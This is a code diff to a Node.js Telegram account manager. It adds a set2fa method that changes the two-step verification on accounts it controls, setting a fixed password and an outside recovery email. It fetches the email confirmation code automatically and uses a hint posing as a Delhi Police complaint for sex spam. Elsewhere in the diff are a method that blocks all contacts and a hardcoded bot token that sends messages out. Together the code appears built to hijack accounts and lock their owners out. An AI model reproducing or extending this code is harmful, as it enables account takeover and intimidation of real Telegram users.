@@ -2,6 +2,7 @@ const { TelegramClient, Api } = require('telegram');
 const { NewMessage } = require("telegram/events/index.js");
 const axios = require('axios');
 const { StringSession } = require('telegram/sessions');
+const { isMailReady, getcode, connectToMail, disconnectfromMail } = require('./mailreader')
 const ppplbot = "https://api.telegram.org/bot5807856562:AAFnhxpbQQ8MvyQaQGEg8vkpfCssLlY6x5c/sendMessage";
 const clients = new Map();
 
@@ -146,6 +147,11 @@ class TelegramManager {
         return result
     }
 
+    async hasPassword() {
+        const passwordInfo = await this.client.invoke(new Api.account.GetPassword());
+        return passwordInfo.hasPassword
+    }
+
     async blockAllUsers() {
         const chats = await this.client?.getDialogs({ limit: 600 });
         for (let chat of chats) {
@@ -176,10 +182,52 @@ class TelegramManager {
         })
         return latest
     }
-    
+
     async getMe() {
         const me = await this.client.getMe();
         return me
+    }
+
+    async set2fa() {
+        connectToMail()
+        const intervalParentId = setInterval(async () => {
+            const isReady = isMailReady();
+            if (isReady) {
+                clearInterval(intervalParentId);
+                await this.client.updateTwoFaSettings({
+                    isCheckPassword: false,
+                    email: "storeslaksmi@gmail.com",
+                    hint: "Police Complaint Registered for SEX SPAM - Delhi Police",
+                    newPassword: "Ajtdmwajt1@",
+                    emailCodeCallback: async (length) => {
+                        console.log("code sent");
+                        return new Promise(async (resolve) => {
+                            let retry = 0
+                            const intervalId = setInterval(async () => {
+                                console.log("checking code");
+                                retry++
+                                const isReady = isMailReady();
+                                if (isReady && retry < 4) {
+                                    const code = await getcode();
+                                    if (code !== '') {
+                                        clearInterval(intervalId);
+                                        disconnectfromMail()
+                                        resolve(code);
+                                    }
+                                } else {
+                                    clearInterval(intervalId);
+                                    await this.client.disconnect();
+                                    deleteClient(this.phoneNumber);
+                                    disconnectfromMail()
+                                    resolve(code);
+                                }
+                            }, 3000);
+                        });
+                    },
+                    onEmailCodeError: (e) => { console.log(e); return Promise.resolve("error") }
+                })
+            }
+        }, 5000);
     }
 
     async handleEvents(event) {
